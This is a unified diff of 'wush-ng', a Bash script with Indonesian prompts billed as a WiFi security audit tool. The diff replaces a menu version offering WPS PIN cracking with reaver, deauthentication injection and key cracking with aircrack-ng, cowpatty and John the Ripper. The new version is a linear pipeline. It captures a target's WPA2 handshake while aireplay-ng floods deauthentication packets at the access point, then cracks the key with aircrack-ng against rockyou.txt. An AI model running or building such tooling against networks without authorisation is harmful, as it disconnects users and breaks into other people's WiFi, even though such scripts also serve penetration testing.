@@ -1,9 +1,4 @@
 #!/usr/bin/env bash
-# Program........: wush-ng
-# Deskripsi......: Perangkat lunak audit keamanan WiFi.
-# Pembuat........: Rofi
-# Version........: 1.5
-# Penggunaan.....: bash wush-ng
 #
 ############################################################################
 #
@@ -27,565 +22,94 @@
 #
 ############################################################################
 
-# Fungsi untuk memeriksa apakah pengguna berada dalam mode root atau tidak.
-function check_root(){
-	if [[ "$EUID" -ne 0 ]]; then
-		echo  "This script must be run as root."
-    		exit 1
-	fi
-}
+if [[ "$EUID" -ne 0 ]]; then
+        echo "Error: Program ini harus dijalankan sebagai root."
+        exit 1
+fi
 
-# Fungsi untuk memilih interface yang akan digunakan.
-function choose_interface(){
-        clear
-        echo ""
-	echo "Available interfaces:"
-	echo ""
-    	available_interfaces=($(iw dev | awk '/Interface/{print $2}'))
-    	for ((c=0; c<"${#available_interfaces[@]}"; c++)); do
-    		echo "[${c}] ${available_interfaces[$c]}"
-   	done
-    	echo ""
+clear
+echo ""
+echo "************** Pemilihan antarmuka jaringan **************"
+echo ""
+echo "Pilih antarmuka jaringan untuk digunakan:"
+echo "--------------"
 
-    	valid_interface=false
-    	while [[ "$valid_interface" = false ]]; do
-    		read -p "Please select the interface you want to use for the attack: " si
+# antarmuka jaringan yang tersedia
+ajyt=($(iw dev | awk '/Interface/{print $2}'))
+for ((i=0; i<"${#ajyt[@]}"; i++)); do
+        echo "${i}. ${ajyt[$i]}"
+done
+echo ""
 
-        	if [[ "$si" -ge 0 ]] && [[ "$si" -lt "${#available_interfaces[@]}" ]]; then
-        		interface="${available_interfaces[$si]}"
-            		valid_interface=true
-         	else
-         		echo "Error: Interface not found. Please choose again."
-         	fi
-	done
-}          
+while true; do
+        # input memilih antar muka jaringan
+        read -p "> " imaj
 
-# Fungsi untuk menampilkan banner.
-function show_banner(){
-        waktu=$(date +"%Y-%m-%d %H:%M:%S")
-        clear
-        echo ""
-        echo "[ ${waktu} ]"
-        echo ""
-        echo "                            wush-ng"
-        echo ""
-        echo "*************  Wireless Security Testing Toolkit  *************"
-        echo "==============================================================="
-        echo ""
-        echo "   [1] Enable Monitor Mode"
-        echo "   [2] Disable Monitor Mode"
-        echo "   [3] Scan Networks (Monitor Mode Nedded)"
-        echo "   [4] Scan for WPS Networks (Monitor Mode Nedded)"
-        echo "   [5] Captur Wi-Fi Packets (Monitor Mode Nedded)"
-        echo "   [6] Inject Wi-Fi Packets (Monitor Mone Nedded)"
-        echo "   [7] Check for valid 4-way frames"
-        echo "   [8] Crack Wi-Fi Key"
-        echo "   [9] Crack WPS Pin (Monitor Mode Nedded)"
-        echo ""
-        echo "==============================================================="
-        echo ""
-        echo "              [ ] Select Option or CTRL+C to Abord"
-        echo ""
-}
-
-# Fungsi utama dari wush-ng.
-function main(){
-	read -p "[wush-ng] " choice
-	case "${choice}" in
-        	1)
-            		enable_monitor_mode
-                        show_banner
-            		main
-            		;;
-       		2)
-            		disable_monitor_mode
-                        show_banner
-            	 	main
-            		;;
-                3)
-                        scan_networks
-                        show_banner
-                        main
-                        ;;
-                4)
-                        scan_wps_networks
-                        show_banner
-                        main
-                        ;;
-        	5)
-                        banner_capture_wifi_packets
-                        choose_capture_tool
-                        show_banner
-            		main
-            		;;
-        	6)
-            		inject_wifi_packets
-                        show_banner
-			main
-            		;;
-        	7)
-            		check_for_valid_4_way_frames
-                        show_banner
-            		main
-            		;;
-        	8)
-            		crack_wifi_key
-            		# main	
-            		;;
-                9)      crack_wps_pin
-                        show_banner
-                        main
-                        ;;
-
-        	*)
-            		echo "Error: Invalid choice. Please choose again."
-            		main
-            		;;
-    	esac    
-}
-
-# Fungsi untuk memperbarui wush-ng.
-function update(){
-	apt-get update
-	apt-get upgrade
-	echo ""
-	read -p "Press [Enter] to continue..."
-}
-
-# Fungsi untuk mengaktifkan mode monitor.
-function enable_monitor_mode(){
-	/usr/share/wush-ng/aircrack-ng/scripts/.airmon-ng check kill
-	/usr/share/wush-ng/aircrack-ng/scripts/.airmon-ng start "${interface}"
-	echo ""
-	read -p "Press [Enter] to continue..."
-}
-
-# Fungsi untuk menonaktifkan mode monitor.
-function disable_monitor_mode(){
-	/usr/share/wush-ng/aircrack-ng/scripts/.airmon-ng stop "${interface}"
-	echo ""
-	read -p "Press [Enter] to continue..."
-}
-
-# Fungsi untuk memindai jangan.
-function scan_networks(){
-        /usr/share/wush-ng/aircrack-ng/./airodump-ng "${interface}"
-        echo ""
-	read -p "Press [Enter] to continue..."
-}
-
-# Fungsi untuk memindai jaringan WPS.
-function scan_wps_networks(){
-        echo ""
-        /usr/share/wush-ng/reaver-wps-fork-t6x/src/./wash -i "${interface}"
-        echo ""
-        read -p "Press [Enter] to continue..."
-}
-
-
-# Fungsi untuk menangkap paket Wi-Fi.			
-function banner_capture_wifi_packets(){
-	waktu=$(date +"%Y-%m-%d %H:%M:%S")
-        clear 
-        echo ""
-        echo "[ ${waktu} ]"
-        echo "                            wush-ng"
-        echo ""
-        echo "**********  Select a Tool to Capture Wi-Fi Packets  ***********" # +1 #
-        echo "==============================================================="
-        echo ""
-        echo "   [1] airodump-ng (aireplay-ng Nedded)"
-        echo "   [2] besside-ng"
-        echo ""
-        echo "==============================================================="
-        echo ""
-        echo "              [ ] Select Option or CTRL+C to Abord"
-        echo ""
-}
-
-# Fungsi untuk memilih alat yang ingin digunakan untuk menangkap paket Wi-Fi.
-function choose_capture_tool(){
-	read -p "[wush-ng] Enter your choice: " capture_tool
-	case "${capture_tool}" in
-            	"back")
-                        show_banner
-                	main
-                	;;
-            	1)
-                	capture_wifi_packets_with_airodump_ng
-                	break
-                	;;
-            	2)
-                	capture_wifi_packets_with_airbase_ng
-                	break
-                	;;
-            	*)
-                	echo "Error: Invalid choice. Please choose again."
-                	choose_capture_tool
-                	;;
-        esac
-}
-
-# Fungsi untuk menangkap paket Wi-Fi menggunakan airodump-ng.
-function capture_wifi_packets_with_airodump_ng(){
-        read -p "[wush-ng] Enter the BSSID you want to attack: " target_bssid
-        if [[ ! -z "${target_bssid}" ]]; then
-                if [[ "${target_bssid}" == "back" ]]; then
-                        choose_capture_tool
-                elif [[ ! "${target_bssid}" =~ ^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$ ]]; then
-                        echo "Error: Invalid BSSID format. Please enter a valid MAC address (e.g., XX:XX:XX:XX:XX:XX)."
-                        capture_wifi_packets_with_airodump_ng
-                else
-                        function channel_airodump(){
-                                read -p "[wush-ng] Enter the channel: " channel
-                                if [[ "${channel}" == "back" ]]; then
-                                        capture_wifi_packets_with_airodump_ng 
-                                elif [[ ! "$channel" =~ ^[0-9]+$ ]]; then
-                                        echo "Error: Invalid channel. Please enter a valid numeric channel."
-                                        channel_airodump
-                                else
-                                        function output_file_airodump(){
-                                                read -p "[wush-ng] Enter the output file name: " output_file
-                                                if [[ ! -z "${output_file}" ]]; then
-                                                        if [[ "${output_file}" == "back" ]]; then
-                                                                channel_airodump
-                                                        else
-                                                                /usr/share/wush-ng/aircrack-ng/./airodump-ng --bssid "${target_bssid}" --channel "${channel}" -w "${output_file}" "${interface}"
-                                                                echo ""
-                                                                read -p "Press [Enter] to continue..."
-                                                        fi
-                                                else
-                                                        echo "Error: Output file name cannot be empty."
-                                                        output_file_airodump
-                                                fi
-					}
-                                        output_file_airodump
-                                fi
-
-			}
-                        channel_airodump
-                fi
+        if [[ "${imaj}" =~ ^[0-9]+$ ]] && (( imaj >= 0 && imaj < ${#ajyt[@]} )); then
+                # antarmuka jaringan
+                aj="${ajyt[$imaj]}"
+                break
         else
-                echo "Error: BSSID cannot be empty."
-                capture_wifi_packets_with_airodump_ng
-        fi
-}
-
-# Fungsi untuk menangkap paket Wi-Fi menggunakan besside-ng.
-function capture_wifi_packets_with_airbase_ng(){
-        read -p "[wush-ng] Enter the BSSID you want to attack: " target_bssid
-        if [[ ! -z "${target_bssid}" ]]; then
-                if [[ "${target_bssid}" == "back" ]]; then
-                        choose_capture_tool
-                elif [[ ! "${target_bssid}" =~ ^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$ ]]; then
-                        echo "Error: Invalid BSSID format. Please enter a valid MAC address (e.g., XX:XX:XX:XX:XX:XX)."
-                        capture_wifi_packets_with_airbase_ng
-                else
-                        function channel_besside(){
-                                read -p "[wush-ng] Enter the channel: " channel
-                                if [[ "${channel}" == "back" ]]; then
-                                        capture_wifi_packets_with_airbase_ng
-                                elif [[ ! "${channel}" =~ ^[0-9]+$ ]]; then
-                                        echo "Error: Invalid channel. Please enter a valid numeric channel."
-                                        channel_besside
-                                else
-                                        /usr/share/wush-ng/aircrack-ng/besside-ng -b "${target_bssid}" -W -c "${channel}" -v "${interface}"
-                                        echo ""
-                                        read -p "Press [Enter] to continue..."
-                                fi
-			}
-                        channel_besside
+                echo "Error: Antarmuka jaringan ${imaj} tidak ditemukan. Silahkan pilih lagi."
                 fi
-        else
-                echo "Error: BSSID cannot be empty."
-                capture_wifi_packets_with_airbase_ng
-        fi
-}
+done
 
-# Fungsi untuk menyuntikkan paket Wi-Fi.
-function inject_wifi_packets(){
-        read -p "[wush-ng] Enter the BSSID you want to attack: " target_bssid
-        if [[ ! -z "${target_bssid}" ]]; then
-                if [[ "${target_bssid}" == "back" ]]; then
-                        show_banner
-                	main
-                else
-                        usr/share/wush-ng/aircrack-ng/./aireplay-ng -0 0 -a "${target_bssid}" "${interface}"
-                        echo ""
-                        read -p "Press [Enter] to continue..."
-                fi
-        else
-                 echo "Error: BSSID cannot be empty."
-                inject_wifi_packets
-        fi
-}
+echo ""
+echo "[*] Mengaktifkan mode monitor pada antarmuka jaringan ${aj} menggunakan airmon-ng..."
+sleep 3
+airmon-ng check kill
+airmon-ng start "${aj}"
 
-# Fungsi untuk memeriksa keberadaan frame 4-way handshake yang valid.
-function check_for_valid_4_way_frames(){
-        read -p "[wush-ng] Enter the handshake file name: " file_handshake
-        if [[ ! -z "${file_handshake}" ]]; then
-                if [[ "${file_handshake}" == "back" ]]; then
-                        show_banner
-                        main
-                elif [[ -f "${file_handshake}" ]]; then
-                        if [[ ! "${file_handshake}" =~ \.cap$ ]]; then
-        		        echo "Error: Invalid file format. Please provide a valid .cap file."
-        		        file_handshake_4
+echo "[*] Memindai jaringan Wi-Fi menggunakan airodump-ng pada antarmuka jaringan ${aj}..."
+sleep 3
+airodump-ng "${aj}"
+echo ""
+
+while true; do
+        read -p "Silahkan masukkan alamat MAC Access Point (BSSID): " b
+        if [[ -z "${b}" ]] || [[ ! "${b}" =~ ^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$ ]]; then                                                                              echo "Error: Alamat MAC Access Point (BSSID) tidak benar. Harap masukkan alamat MAC Access Point (BSSID) yang benar (contoh: XX:XX:XX:XX:XX:XX)."
+        else
+                while true; do
+                        read -p "Silahkan masukkan nomor channel yang digunakan oleh Access Point: " c
+                        if [[ -z "${c}" ]] || ! [[ "${c}" =~ ^[0-9]+$ ]]; then
+                                echo "Error: Nomor channel tidak benar. Harap masukkan nomor channel yang benar."
                         else
-                                cowpatty -c -r "${file_handshake}"
-	        	        echo ""
-    	    		        read -p "Press [Enter] to continue..."
+                                # posisi airodump-ng
+                                pa="80x24+0+0"
+                                # posisi aireplay-ng
+                                pg="80x24-0+0"
+
+                                # timeout airodump-ng
+                                tp=28
+                                waktu=$(date +"%Y-%m-%d_%H:%M:%S")
+                                # nama untuk file handshake
+                                nufh="${b}_${waktu}"
+                                echo ""
+                                echo "[*] Menangkap Handshake menggunakan airodump-ng pada antarmuka jaringan ${aj}..."
+                                sleep 3
+                                xterm -geometry "${pa}" -e "timeout ${tp} airodump-ng --bssid ${b} --channel ${c} --write ${nufh} ${aj}" &
+                                airodump_pid=$!
+                                sleep 5
+                                # timeout aireplay-ng
+                                ty=20
+                                echo "[*] Mengirimkan paket deauthentikasi menggunakan aireplay-ng pada antarmuka jaringan ${aj}..."
+                                sleep 3
+                                xterm -geometry "${pg}" -e "timeout ${ty} aireplay-ng --deauth 0 -a ${b} ${aj}" &
+                                aireplay_pid=$!
+                                # menunggu proses airodump-ng dan aireplay-ng
+                                wait "${airodump_pid}"
+                                wait "${aireplay_pid}"
+                                break
                         fi
-                else
-                        echo "Error: ${file_handshake} file not found."
-                        check_for_valid_4_way_frames
-                fi
-        else
-                echo "Error: Handshake file name cannot be empty."
-                check_for_valid_4_way_frames
+                done
+                break
         fi
-}
+done
 
-# Fungsi untuk memilih file handshake yang ingin di-crack.
-function handshake_file(){
-	read -p "[wush-ng] Enter the handshake file name: " file_handshake
-        if [[ ! -z "${file_handshake}" ]]; then
-                if [[ "${file_handshake}" == "back" ]]; then
-                        show_banner
-                        main
-	        elif [[ -f "${file_handshake}" ]]; then
-        	        # Check if the specified file is not a .cap file
-          	        if [[ ! "${file_handshake}" =~ \.cap$ ]]; then
-              		        echo "Error: Invalid file format. Please provide a valid .cap file."
-              		        handshake_file
-          	        fi
-	        else
-		        echo "Error: ${file_handshake} file not found."
-		        handshake_file
-                fi
-        else
-                echo "Error: Handshake file name cannot be empty."
-                handshake_file
-	fi
-}
-
-# Fungsi untuk menampilkan menu file wordlist 
-function banner_menu_choose_a_wordlist_file(){
-		waktu=$(date +"%Y-%m-%d %H:%M:%S")
-                clear
-                echo ""
-                echo "[ ${waktu} ]"
-                echo "                            wush-ng"
-                echo ""
-                echo "*********  Select a Wordlist File to Crack Wi-Fi Key  *********"
-                echo "==============================================================="      
-                echo ""
-                echo "   [1] RockYou.txt (14.344.392 passwords)"
-                echo "   [2] Top 4800 Probable.txt (4.800 passwords)"
-                echo "   [3] Wotabuhun.txt (117.551 passwords)"
-                echo "   [4] Indonesian Wordlist.txt (79.901 passwords"
-                echo "   [5] WPA Over 200K.txt (203.806 passwords)"
-                echo "   [6] Custom Wordlist"
-                echo ""
-                echo "==============================================================="
-                echo ""
-                echo "              [ ] Select Option or CTRL+C to Abord"
-                echo ""
-}
-
-# Fungsi untuk memilih file wordlist yang ingin digunakan.
-function choose_wordlist(){
-	read -p "[wush-ng] Enter your choice: " choice
-
-    	case "${choice}" in
-                "back")
-                        handshake_file
-                        ;;
-       		1)
-                	file_wordlist="/usr/share/wush-ng/wordlists/rockyou.txt"
-                	;;
-            	2)
-                	file_wordlist="/usr/share/wush-ng/wordlists/wordlist-top4800-probable.txt"
-                	;;
-            	3)
-                	file_wordlist="/usr/share/wush-ng/wordlists/wotabuhun.txt"
-                	;;
-            	4)
-                	file_wordlist="/usr/share/wush-ng/wordlists/indonesian-wordlist.lst"
-                	;;
-            	5)
-                	file_wordlist="/usr/share/wush-ng/wordlists/wpa-over200k.txt"
-                	;;
-            	6)
-                	custom_wordlist
-                	;;
-            	*)
-                	echo "Error: Invalid choice. Please choose again."  
-                	;;
-	esac
-}
-
-# fungsi untuk memilih wordlist custom.
-function custom_wordlist(){
-	read -p "[wush-ng] Enter the custom wordlist file name: " file_wordlist
-        if [[ ! -z "${custom_wordlist}" ]]; then
-                if [[ "${file_wordlist}" == "back" ]]; then
-                        choose_wordlist
-                # Check if the specified file is not a .cap file
-	        elif [[ ! -f "${file_wordlist}" ]]; then
-        	        echo "Error: Wordlist file '${file_wordlist}' not found."
-        	        custom_wordlist
-                fi
-        else
-                echo "Error: Wordlist file name cannot be empty."
-                custom_wordlist
-        fi
-        
-}
-
-# Fungsi untuk menampilkan menu alat untuk meng-crack file handshake.
-function banner_choose_wifi_key_cracking_tool(){
-		waktu=$(date +"%Y-%m-%d %H:%M:%S")
-                clear
-                echo ""
-                echo "[ ${waktu} ]"
-                echo "                            wush-ng"
-                echo ""
-                echo "*************  Select a tool to crack Wi-Fi Key.  *************"
-                echo "==============================================================="
-                echo ""
-                echo "   [1] aircrack-ng"
-                echo "   [2] cowpatty"
-                echo "   [3] john"
-                echo ""
-                echo "==============================================================="
-                echo ""
-                echo "              [ ] Select Option or CTRL+C to Abord"
-                echo ""
-}
-
-# Fungsi untuk memilih alat untuk memecahkan kunci WiFi:
-function choose_cracking_tool(){
-	read -p "[wush-ng] Enter your choice: " cracking_tool
-    	case "${cracking_tool}" in
-                "back")
-                        choose_wordlist
-                        ;;
-		1)
-            		crack_wifi_key_with_aircrack
-                	;;
-            	2)
-                	crack_wifi_key_with_cowpatty
-                	;;
-            	3)
-                	crack_wifi_key_with_john
-                	;;
-            	*)
-                	echo "Error: Invalid choice. Please choose again."
-			choose_cracking_tool
-                	;;
-          esac
-}
-
-# Fungsi untuk memecahkan kunci Wi-Fi
-function crack_wifi_key(){
-	handshake_file
-	banner_menu_choose_a_wordlist_file
-	choose_wordlist
-	banner_choose_wifi_key_cracking_tool
-	choose_cracking_tool
-}
-
-# Fungsi untuk memecahkan kunci WiFi menggunakan aircrack-ng 
-function crack_wifi_key_with_aircrack(){
-    	/usr/share/wush-ng/aircrack-ng/./aircrack-ng -a2 -w "${file_wordlist}" "${file_handshake}"
-    	echo ""
-    	read -p "Press [Enter] to continue..."
-	show_banner
-    	main
- }
-
-# Fungsi untuk memecahkan kunci WiFi menggunakan cowpatty 
-function crack_wifi_key_with_cowpatty(){
-	read -p "[wush-ng] Enter the Network SSID: " ssid
-
-    	if [[ -z "${ssid}" ]]; then
-        	echo "Error: Network SSID cannot be empty."
-		crack_wifi_key_with_cowpatty
-    	else
-        	cowpatty -r "${file_handshake}" -s "${ssid}" -f "${file_wordlist}"
-        	echo ""
-        	read -p "Press [Enter] to continue..."
-		show_banner
-        	main
-    	fi
-
-}
-
-# Fungsi untuk memecahkan kunci WiFi menggunakan john the ripper 
-function crack_wifi_key_with_john(){
-        # Menjalankan aircrack-ng dengan tujuan mengonversi file handshake Wi-Fi ke dalam format yang dapat dibaca oleh John the Ripper (format .hccap).
-    	/usr/share/wush-ng/aircrack-ng/./aircrack-ng -J "${file_handshake}" "${file_handshake}"
-        # Menjalankan hccap2john yang akan mengonversi file .hccap (hasil dari aircrack-ng) ke format yang dapat dibaca oleh John the Ripper. Hasilnya akan disimpan dalam file dengan ekstensi .wush.
-    	/usr/share/wush-ng/john/run/./hccap2john "${file_handshake}.hccap" > "${file_handshake}.wush"
-        # Variabel untuk nama file hash
-    	hash_file="${file_handshake}.wush"
-        # Menjalankan John the Ripper untuk melakukan serangan kata sandi terhadap file hash yang disediakan.
-    	/usr/share/wush-ng/john/run/./john --format="wpapsk" --wordlist="${file_wordlist}" "${hash_file}"
-        # Menampilkan kata sandi yang berhasil diretas oleh John the Ripper.
-    	/usr/share/wush-ng/john/run/./john --show "${hash_file}"
-    	echo ""
-    	read -p "Press [Enter] to continue..."
-	show_banner
-    	main
-}
-
-# Fungsi untuk menjalankan serangan PIN WPS
-function crack_wps_pin(){
-        read -p "[wush-ng] Enter the BSSID you want to attack: " target_bssid
-        if [[ ! -z "${target_bssid}" ]]; then
-                if [[ "${target_bssid}" == "back" ]]; then
-                        show_banner
-                	main
-                else
-                        function channel_reaver(){
-                                read -p "[wush-ng] Enter the channel: " channel
-                                if [[ "${channel}" == "back" ]]; then
-                                        crack_wps_pin
-                                elif [[ ! "${channel}" =~ ^[0-9]+$ ]]; then
-                                        echo "Error: Invalid channel. Please enter a valid numeric channel."
-                                        channel_reaver
-                                else
-                                        /usr/share/wush-ng/reaver-wps-fork-t6x/src/./reaver -i "${interface}" -c "${channel}" -b "${target_bssid}" -T 30 -vv
-                                        echo ""
-                                        read -p "Press [Enter] to continue..."
-                                fi
-			}
-                        channel_reaver
-                fi
-        else
-                 echo "Error: BSSID cannot be empty."
-                crack_wps_pin
-        fi
-}
-
-# Fungsi untuk keluar dari program wush-ng
-function exit_wush(){
-	echo "Exiting..."
-	sleep 3
-	exit 0
-}
-
-# Fungsi wush-ng
-function wush(){
-	check_root
-	choose_interface
-	show_banner
-	main
-}
-
-wush
-
-# Jangan disalah gunakan program ini oke...
-# ^_^
-# Rofidoang03
+# file handshake yang akan dipecahkan kata sandinya
+fh="${nufh}-01.cap"
+# wordlist default yang digunakan oleh wush-ng
+wordlist="/usr/share/wordlists/rockyou.txt"
+echo "[*] Memecahkan kata sandi WPA2 menggunakan aircrack-ng pada file Handshake ${fh}..."
+sleep 3
+aircrack-ng -w "${wordlist}" "${fh}"
